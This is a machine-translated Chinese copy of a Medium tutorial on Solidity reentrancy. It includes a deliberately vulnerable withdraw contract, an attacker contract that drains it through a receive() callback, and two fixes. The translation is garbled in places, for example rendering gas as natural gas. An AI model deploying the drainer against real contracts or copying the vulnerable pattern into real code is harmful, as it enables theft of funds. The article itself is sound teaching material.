<html>
<head>
<title>Reentrancy exploit</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">可重入性利用</h1>
<blockquote>原文：<a href="https://medium.com/coinmonks/reentrancy-exploit-ac5417086750?source=collection_archive---------0-----------------------#2020-08-29">https://medium.com/coinmonks/reentrancy-exploit-ac5417086750?source=collection_archive---------0-----------------------#2020-08-29</a></blockquote><div><div class="ef hh hi hj hk hl"/><div class="hm hn ho hp hq"><div class=""/><p id="243d" class="pw-post-body-paragraph iq ir ht is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hm dt translated"><a class="ae jo" href="https://www.ama.fans/graphicaldot/post/0x8ae6fdb9c256acdce326b324ff1ee400f46d79e78a03a11bc74e144c164124b5" rel="noopener ugc nofollow" target="_blank">https://www . ama . fans/graphical dot/post/0 x8a E6 fdb 9 c 256 acdce 326 b 324 ff 1ee 400 f 46d 79 e 78 a 03 a 11 BC 74 e 144 c 164124 b 5</a></p><figure class="jq jr js jt fq ju fe ff paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="fe ff jp"><img src="../Images/0f62cd7b87b0d5061b7e43f704527879.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gS5LrNiH42Pjtg7NZjKO9Q.png"/></div></div></figure><p id="1bc2" class="pw-post-body-paragraph iq ir ht is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hm dt translated">Solidity支持三种在钱包和智能合约之间转移以太的方式。这些支持的传输以太网的方法是send()、transfer()和call.value()。这些方法的不同之处在于它们传递给传输的用于执行其他方法的气体量(如果接收方是智能合同)，以及它们处理异常的方式。发送()和调用()。如果失败，value()只会返回false，但是transfer()会抛出一个异常，该异常还会将状态恢复到函数调用之前的状态。这些方法总结如下</p><figure class="jq jr js jt fq ju fe ff paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="fe ff kb"><img src="../Images/f0328bff3a076c1dd8081e94e00c6b02.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*QZCKLw4CboC4aVmP.png"/></div></div></figure><p id="a307" class="pw-post-body-paragraph iq ir ht is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hm dt translated">因此，您的send()函数应该始终位于require语句中，以通知您执行失败。</p><p id="5ca5" class="pw-post-body-paragraph iq ir ht is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hm dt translated">在transfer()的情况下，您在尝试执行时就知道您的事务不成功。</p><p id="86fe" class="pw-post-body-paragraph iq ir ht is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hm dt translated">最后，在call()的情况下，如果出现错误，它仍然会返回false ，这就是为什么要记住<code class="eh kc kd ke kf b">require()</code>的用法。与前两个功能的主要区别是<strong class="is hu">有机会通过<strong class="is hu">设置气体限制</strong>。调用{value: _amount，gas: gasValue}("") </strong>。这是必要的，以防合同接收以太网的可支付功能执行复杂的逻辑，这需要大量的气体。</p><p id="db6a" class="pw-post-body-paragraph iq ir ht is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hm dt translated">一个契约最多可以有一个使用<code class="eh kc kd ke kf b">receive() external payable { ... }</code>声明的<code class="eh kc kd ke kf b">receive</code>函数(没有<code class="eh kc kd ke kf b">function</code>关键字)。这个函数不能有参数，不能返回任何东西，必须有<code class="eh kc kd ke kf b">external</code>可见性和<code class="eh kc kd ke kf b">payable</code>状态可变性。它在调用带有空calldata的协定时执行。这是在普通以太网传输上执行的功能(例如通过<code class="eh kc kd ke kf b">.send()</code>或<code class="eh kc kd ke kf b">.transfer()</code>)。如果不存在这样的函数，但是存在可支付的<a class="ae jo" href="https://solidity.readthedocs.io/en/v0.6.10/contracts.html#fallback-function" rel="noopener ugc nofollow" target="_blank">回退函数</a>，则回退函数将在普通以太网传输中被调用。如果receive Ether和payable fallback函数都不存在，则协定无法通过常规事务接收Ether并引发异常。</p><p id="f8d4" class="pw-post-body-paragraph iq ir ht is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hm dt translated">在最坏的情况下，回退功能只能依靠2300气体可用(例如当使用<code class="eh kc kd ke kf b">send</code>或<code class="eh kc kd ke kf b">transfer</code>时)，几乎没有空间来执行除基本测井之外的其他操作。以下操作将消耗比2300汽油津贴更多的汽油:</p><ul class=""><li id="c7a3" class="kg kh ht is b it iu ix iy jb ki jf kj jj kk jn kl km kn ko dt translated">写入存储</li><li id="fa14" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated">创建合同</li><li id="1e72" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated">调用消耗大量气体的外部函数</li><li id="5dde" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated">发送以太网</li></ul><p id="0c8c" class="pw-post-body-paragraph iq ir ht is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hm dt translated">但近年来，使用call()函数传输以太而不是传输和发送已经成为一种规范，原因如下:任何使用<code class="eh kc kd ke kf b">transfer()</code>或<code class="eh kc kd ke kf b">send()</code>的智能合同都是通过转发固定量的天然气来硬依赖天然气成本:2300。</p><p id="21fd" class="pw-post-body-paragraph iq ir ht is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hm dt translated">更多阅读这里:<a class="ae jo" href="https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/" rel="noopener ugc nofollow" target="_blank">https://diligence . consensys . net/blog/2019/09/stop-using-soliditys-transfer-now/</a></p><p id="3473" class="pw-post-body-paragraph iq ir ht is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hm dt translated">这整个背景对于理解重入攻击是必要的。让我们考虑下面的合同:</p><pre class="jq jr js jt fq ku kf kv kw aw kx dt"><span id="fac3" class="ky kz ht kf b fv la lb l lc ld">// SPDX-License-Identifier: Unlicensed<br/>pragma solidity ^0.6.10;</span><span id="b806" class="ky kz ht kf b fv le lb l lc ld">contract EtherRentrancy {<br/>    <br/>    mapping (address =&gt; uint256) public balances;<br/>    address public owner;<br/>    <br/>    constructor() public {<br/>        owner = msg.sender;<br/>    }<br/>    <br/>    function deposit() public payable{<br/>        balances[msg.sender] += msg.value;<br/>    }<br/>    <br/>    <br/>    function withdraw(uint _amount) public {<br/>        require (balances[msg.sender] &gt;= _amount, "Insufficient funds");<br/>        <br/>        (bool sent, ) = msg.sender.call{value: _amount}("");<br/>        require(sent, "Failed to send funds");<br/>        <br/>        balances[msg.sender] -= _amount;<br/>    }<br/>    <br/>    function getBalance() public view returns(uint){<br/>        return address(this).balance;<br/>        <br/>    }<br/>    <br/>}</span></pre><p id="1783" class="pw-post-body-paragraph iq ir ht is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hm dt translated">在这个契约中，任何有效的以太坊地址都可以通过存款功能存入以太，并可以通过取款功能提取他们的以太。</p><p id="e942" class="pw-post-body-paragraph iq ir ht is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hm dt translated">这是我们将用来从上述合同中抽干所有资金的合同。</p><pre class="jq jr js jt fq ku kf kv kw aw kx dt"><span id="6e21" class="ky kz ht kf b fv la lb l lc ld">contract HelloBreaksLoose{<br/>    EtherRentrancy etherrentrancy;<br/>    <br/>    constructor(address _etherrentrancy) public {<br/>        etherrentrancy = EtherRentrancy(_etherrentrancy);<br/>    }</span><span id="c4cd" class="ky kz ht kf b fv le lb l lc ld">    receive() external payable {<br/>        if (etherrentrancy.getBalance() &gt;= 1 ether){<br/>            etherrentrancy.withdraw(1 ether);<br/>            <br/>        }<br/>    }</span><span id="024d" class="ky kz ht kf b fv le lb l lc ld">    function attack() external payable{<br/>        require(msg.value &gt;= 1 ether);<br/>        etherrentrancy.deposit{value: msg.value}();<br/>        etherrentrancy.withdraw(1 ether);<br/>        <br/>        <br/>    }<br/>    function getBalance() public view returns(uint){<br/>        return address(this).balance;<br/>        <br/>    }</span><span id="7eb9" class="ky kz ht kf b fv le lb l lc ld">}</span></pre><p id="07b1" class="pw-post-body-paragraph iq ir ht is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hm dt translated">应该使用以太网协议的地址部署该协议。</p><p id="7036" class="pw-post-body-paragraph iq ir ht is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hm dt translated">下面是调用这个契约的函数<strong class="is hu"> attack() </strong>时的执行步骤:Step1: attack()，</p><p id="9839" class="pw-post-body-paragraph iq ir ht is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hm dt translated">第二步:在以太网租赁合同上用1个以太网存款()；</p><p id="b9f8" class="pw-post-body-paragraph iq ir ht is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hm dt translated">第三步:撤销()以太网租约函数；</p><p id="3b99" class="pw-post-body-paragraph iq ir ht is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hm dt translated">step 4:retract()函数反过来会调用HelloBreaksLoose的receive函数；</p><p id="b4b0" class="pw-post-body-paragraph iq ir ht is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hm dt translated">步骤5: receive函数将再次调用withdraw()函数；</p><p id="9661" class="pw-post-body-paragraph iq ir ht is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hm dt translated">最后两步——步骤3和步骤4——将循环运行，直到EtherRentrancy的余额小于1 ether。</p><p id="d14a" class="pw-post-body-paragraph iq ir ht is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hm dt translated">有两种方法可以阻止这种攻击:</p><ol class=""><li id="6348" class="kg kh ht is b it iu ix iy jb ki jf kj jj kk jn lf km kn ko dt translated">更改撤销函数:在从契约中进行任何外部调用之前，更新状态变量。</li></ol><pre class="jq jr js jt fq ku kf kv kw aw kx dt"><span id="4f2c" class="ky kz ht kf b fv la lb l lc ld">function withdraw(uint _amount) public {<br/>        require (balances[msg.sender] &gt;= _amount, "Insufficient f unds");<br/>       //Now, update to state variable balances is happening before        // the call, the attacker wouldnt be able to withdraw<br/>       // funds more than he/she deposited. Subsequent calls into <br/>       //this function will fail as the depositor will not have <br/>        // funds.</span><span id="51cc" class="ky kz ht kf b fv le lb l lc ld">        balances[msg.sender] -= _amount;<br/>        (bool sent, ) = msg.sender.call{value: _amount}("");<br/>        require(sent, "Failed to send funds");<br/>        <br/>        <br/>    }</span></pre><p id="3687" class="pw-post-body-paragraph iq ir ht is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hm dt translated">2.使用修饰符blockRentrancy:其思想是在契约的任何功能被执行时锁定契约，因此一次只能执行契约中的一个功能。</p><pre class="jq jr js jt fq ku kf kv kw aw kx dt"><span id="10c8" class="ky kz ht kf b fv la lb l lc ld">bool internal locked; //only contract can change this variable</span><span id="8964" class="ky kz ht kf b fv le lb l lc ld">modifier blockRentrancy {</span><span id="1206" class="ky kz ht kf b fv le lb l lc ld">    require(!locked, "Contract is locked");<br/>    locked = true;<br/>     _;<br/>     locked = false; //set locked = false after completion of      <br/>                     // function execution</span><span id="98e4" class="ky kz ht kf b fv le lb l lc ld">}</span><span id="9ae5" class="ky kz ht kf b fv le lb l lc ld">//Use this modifier in contract functions<br/>function withdraw(uint _amount) public blockRentrancy{ .....}</span></pre><h2 id="173f" class="ky kz ht bd lg lh li lj lk ll lm ln lo jb lp lq lr jf ls lt lu jj lv lw lx ly dt translated">另外，阅读</h2><ul class=""><li id="02dc" class="kg kh ht is b it lz ix ma jb mb jf mc jj md jn kl km kn ko dt translated">最好的<a class="ae jo" rel="noopener" href="/coinmonks/crypto-trading-bot-c2ffce8acb2a">密码交易机器人</a></li><li id="b851" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated"><a class="ae jo" rel="noopener" href="/coinmonks/top-10-crypto-copy-trading-platforms-for-beginners-d0c37c7d698c">密码本交易平台</a></li><li id="ae2d" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated">最好的<a class="ae jo" rel="noopener" href="/coinmonks/best-crypto-tax-tool-for-my-money-72d4b430816b">加密税务软件</a></li><li id="92e4" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated"><a class="ae jo" rel="noopener" href="/coinmonks/the-best-crypto-trading-platforms-in-2020-the-definitive-guide-updated-c72f8b874555">最佳加密交易平台</a></li><li id="d8fc" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated">最佳<a class="ae jo" rel="noopener" href="/coinmonks/top-5-crypto-lending-platforms-in-2020-that-you-need-to-know-a1b675cec3fa">加密贷款平台</a></li><li id="4f10" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated"><a class="ae jo" href="https://bitquery.io/blog/best-blockchain-analysis-tools-and-software" rel="noopener ugc nofollow" target="_blank">最佳区块链分析工具</a></li><li id="d432" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated"><a class="ae jo" rel="noopener" href="/coinmonks/crypto-arbitrage-guide-how-to-make-money-as-a-beginner-62bfe5c868f6">加密套利</a>指南:新手如何赚钱</li><li id="aa54" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated">最佳<a class="ae jo" rel="noopener" href="/coinmonks/what-are-the-best-charting-platforms-for-cryptocurrency-trading-85aade584d80">加密制图工具</a></li><li id="15e1" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated"><a class="ae jo" rel="noopener" href="/coinmonks/ledger-vs-trezor-best-hardware-wallet-to-secure-cryptocurrency-22c7a3fd391e">莱杰vs特雷佐</a></li><li id="56fd" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated">了解比特币最好的<a class="ae jo" rel="noopener" href="/coinmonks/what-are-the-best-books-to-learn-bitcoin-409aeb9aff4b">书籍有哪些？</a></li><li id="170f" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated"><a class="ae jo" rel="noopener" href="/coinmonks/3commas-review-an-excellent-crypto-trading-bot-2020-1313a58bec92">3商业评论</a></li><li id="d145" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated"><a class="ae jo" rel="noopener" href="/coinmonks/aax-exchange-review-2021-67c5ea09330c"> AAX交易所评论</a> |推荐代码、交易费用、利弊</li><li id="54f9" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated"><a class="ae jo" rel="noopener" href="/coinmonks/deribit-review-options-fees-apis-and-testnet-2ca16c4bbdb2"> Deribit审查</a> |选项、费用、API和Testnet</li><li id="e34b" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated"><a class="ae jo" rel="noopener" href="/coinmonks/ftx-crypto-exchange-review-53664ac1198f"> FTX密码交易所评论</a></li><li id="d0c3" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated"><a class="ae jo" rel="noopener" href="/coinmonks/ngrave-zero-review-c465cf8307fc">零审核</a></li><li id="1310" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated"><a class="ae jo" rel="noopener" href="/coinmonks/bybit-exchange-review-dbd570019b71"> Bybit交换审查</a></li><li id="8b1e" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated"><a class="ae jo" rel="noopener" href="/coinmonks/cryptohopper-vs-3commas-vs-shrimpy-a2c16095b8fe"> 3Commas vs Cryptohopper </a></li><li id="b18b" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated">最好的比特币<a class="ae jo" rel="noopener" href="/coinmonks/the-best-cryptocurrency-hardware-wallets-of-2020-e28b1c124069?source=friends_link&amp;sk=324dd9ff8556ab578d71e7ad7658ad7c">硬件钱包</a></li><li id="e7b1" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated">最佳<a class="ae jo" href="https://blog.coincodecap.com/best-monero-wallets" rel="noopener ugc nofollow" target="_blank"> monero钱包</a></li><li id="747f" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated"><a class="ae jo" href="https://blog.coincodecap.com/ledger-nano-s-vs-x" rel="noopener ugc nofollow" target="_blank">莱杰nano s vs x </a></li><li id="ace6" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated"><a class="ae jo" href="https://blog.coincodecap.com/bitsgap-3commas-quadency" rel="noopener ugc nofollow" target="_blank">bits gap vs 3 commas vs quad ency</a></li><li id="a274" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated"><a class="ae jo" href="https://blog.coincodecap.com/ledger-nano-s-vs-trezor-one-ledger-nano-x-trezor-t" rel="noopener ugc nofollow" target="_blank">莱杰Nano S vs特雷佐one vs特雷佐T vs莱杰Nano X </a></li><li id="44f0" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated"><a class="ae jo" rel="noopener" href="/coinmonks/blockfi-vs-celsius-vs-hodlnaut-8a1cc8c26630">block fi vs Celsius</a>vs Hodlnaut</li><li id="52d0" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated">Bitsgap评论——一个轻松赚钱的加密交易机器人</li><li id="92c0" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated"><a class="ae jo" rel="noopener" href="/coinmonks/quadency-review-a-crypto-trading-automation-platform-3068eaa374e1"> Quadency Review </a> -为专业人士打造的加密交易机器人</li><li id="22eb" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated"><a class="ae jo" rel="noopener" href="/coinmonks/primexbt-review-88e0815be858"> PrimeXBT评论</a> |杠杆交易、费用和交易</li><li id="62d2" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated"><a class="ae jo" rel="noopener" href="/coinmonks/ellipal-titan-review-85e9071dd029">埃利帕尔泰坦评论</a></li><li id="1a26" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated"><a class="ae jo" href="https://blog.coincodecap.com/secux-stone-hardware-wallet-review" rel="noopener ugc nofollow" target="_blank"> SecuX Stone评论</a></li><li id="31ff" class="kg kh ht is b it kp ix kq jb kr jf ks jj kt jn kl km kn ko dt translated"><a class="ae jo" rel="noopener" href="/coinmonks/blockfi-review-53096053c097"> BlockFi评论</a> |从您的密码中赚取高达8.6%的利息</li></ul></div></div>    
</body>
</html>